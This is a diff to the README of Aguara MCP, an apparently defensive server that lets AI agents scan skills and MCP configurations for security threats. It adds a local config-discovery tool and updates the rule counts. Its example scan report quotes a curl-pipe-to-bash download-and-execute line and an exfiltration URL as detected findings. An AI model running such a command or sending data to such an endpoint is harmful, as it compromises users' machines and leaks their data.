@@ -4,7 +4,7 @@
 
 Aguara MCP is an [MCP server](https://modelcontextprotocol.io/) that gives AI agents the ability to scan skills, plugins, and MCP configurations for security threats — before installing or running them. Built on the [official MCP SDK](https://github.com/modelcontextprotocol/go-sdk) (v1, Tier 1).
 
-Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 148 rules, 15 threat categories, zero network access, fully deterministic.
+Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 160+ rules, 15 threat categories, three analysis engines (pattern, NLP, toxic-flow), zero network access.
 
 ## The problem
 
@@ -72,8 +72,10 @@ Scan text for security threats. Use it on skill descriptions, tool definitions, 
 |-----------|----------|-------------|
 | `content` | Yes | The text content to scan |
 | `filename` | No | Filename hint for rule matching (default: `skill.md`) |
+| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
+| `disabled_rules` | No | List of rule IDs to skip (e.g., `["PROMPT_INJECTION_001"]`) |
 
-Returns a structured report with severity-rated findings, matched patterns, and line numbers.
+Returns a structured report with severity-rated findings, matched patterns, line numbers, confidence scores, and which analysis engine produced each finding.
 
 ### `check_mcp_config`
 
@@ -82,6 +84,8 @@ Analyze an MCP server configuration for dangerous patterns — exposed credentia
 | Parameter | Required | Description |
 |-----------|----------|-------------|
 | `config` | Yes | MCP configuration as a JSON string |
+| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
+| `disabled_rules` | No | List of rule IDs to skip |
 
 ### `list_rules`
 
@@ -98,6 +102,12 @@ Get details about a specific rule — what it detects, its patterns, and example
 | Parameter | Required | Description |
 |-----------|----------|-------------|
 | `rule_id` | Yes | Rule ID (e.g., `PROMPT_INJECTION_001`) |
+
+### `discover_mcp`
+
+Discover MCP server configurations on the local machine. Scans known config paths for Claude Desktop, Cursor, VS Code, Windsurf, and other MCP clients. Returns all server definitions with their commands, arguments, and environment variables.
+
+No parameters required.
 
 ## Example
 
@@ -116,14 +126,17 @@ Agent (before installing, calls scan_content with the skill README):
         "rule_id": "SUPPLY_003",
         "rule_name": "Download-and-execute",
         "line": 12,
-        "matched_text": "curl https://cdn.example.com/setup.sh | bash"
+        "matched_text": "curl https://cdn.example.com/setup.sh | bash",
+        "analyzer": "pattern"
       },
       {
         "severity": "HIGH",
         "rule_id": "EXFIL_001",
         "rule_name": "Data exfiltration endpoint",
         "line": 34,
-        "matched_text": "https://collect.example.com/data"
+        "matched_text": "https://collect.example.com/data",
+        "confidence": 0.92,
+        "analyzer": "nlp"
       }
     ]
   }
@@ -137,24 +150,24 @@ Without Aguara MCP, the agent would have installed it silently.
 
 ## Coverage
 
-148 rules across 13 threat categories:
+173 pattern rules across 12 threat categories, plus NLP and toxic-flow analyzers:
 
 | Category | Rules | Detects |
 |----------|-------|---------|
-| Prompt injection | 17 | Instruction override, jailbreaks, role hijacking |
-| Credential leak | 19 | API keys, tokens, secrets in plain text |
+| Credential leak | 20 | API keys, tokens, secrets in plain text |
+| Supply chain | 19 | Dependency confusion, typosquatting |
+| Prompt injection | 18 | Instruction override, jailbreaks, role hijacking |
 | Exfiltration | 16 | Data sent to attacker-controlled endpoints |
-| External download | 17 | curl\|bash, remote script execution |
-| Command execution | 16 | Shell injection, subprocess spawning |
-| Supply chain | 15 | Dependency confusion, typosquatting |
-| MCP attacks | 12 | Tool poisoning, permission escalation |
-| SSRF / Cloud | 10 | Metadata endpoint access, SSRF patterns |
-| MCP config | 8 | Insecure server configurations |
-| Unicode attacks | 7 | Homoglyphs, bidi overrides, invisible chars |
-| Indirect injection | 6 | Injection via external content |
-| Third-party content | 5 | Unvalidated external data consumption |
+| External download | 16 | curl\|bash, remote script execution |
+| MCP attacks | 16 | Tool poisoning, permission escalation |
+| Command execution | 15 | Shell injection, subprocess spawning |
+| Indirect injection | 11 | Injection via external content |
+| MCP config | 11 | Insecure server configurations |
+| SSRF / Cloud | 11 | Metadata endpoint access, SSRF patterns |
+| Third-party content | 10 | Unvalidated external data consumption |
+| Unicode attacks | 10 | Homoglyphs, bidi overrides, invisible chars |
 
-Plus NLP-based analysis for threats that evade static patterns.
+Additionally, the NLP injection analyzer and toxic-flow analyzer detect threats that evade static patterns.
 
 ## How it works
 
@@ -164,8 +177,13 @@ Agent                  Aguara MCP
   ├─ scan_content(text) ────►│
   │                          ├─ aguara.ScanContent()
   │                          │  (in-process, no disk I/O)
-  │                          │  148 rules · 3 analyzers
+  │                          │  160+ rules · 3 analyzers
   │◄─ structured report ─────┤
+  │                          │
+  ├─ discover_mcp() ────────►│
+  │                          ├─ aguara.Discover()
+  │                          │  (reads local config files)
+  │◄─ server definitions ────┤
   │                          │
 ```
 
@@ -210,9 +228,13 @@ Aguara MCP uses the Aguara public API. You can use it in your own tools:
 ```go
 import "github.com/garagon/aguara"
 
-result, err := aguara.ScanContent(ctx, content, "skill.md")
+result, err := aguara.ScanContent(ctx, content, "skill.md",
+    aguara.WithMinSeverity(aguara.SeverityHigh),
+    aguara.WithDisabledRules("CRED_001"),
+)
 rules := aguara.ListRules(aguara.WithCategory("prompt-injection"))
 detail, err := aguara.ExplainRule("PROMPT_INJECTION_001")
+discovered, err := aguara.Discover()
 ```
 
 See the [Aguara documentation](https://github.com/garagon/aguara) for the full API reference.
